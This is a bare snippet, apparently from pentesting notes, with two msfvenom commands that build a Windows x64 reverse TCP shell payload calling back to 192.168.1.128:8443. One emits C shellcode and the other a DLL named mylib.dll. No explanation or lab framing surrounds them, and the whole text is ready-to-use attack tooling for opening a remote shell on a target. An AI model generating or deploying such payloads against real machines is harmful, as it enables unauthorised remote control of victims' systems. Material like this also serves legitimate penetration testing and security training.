



```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.128 LPORT=8443 -f c
// dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.128 LPORT=8443 -f dll -o mylib.dll
```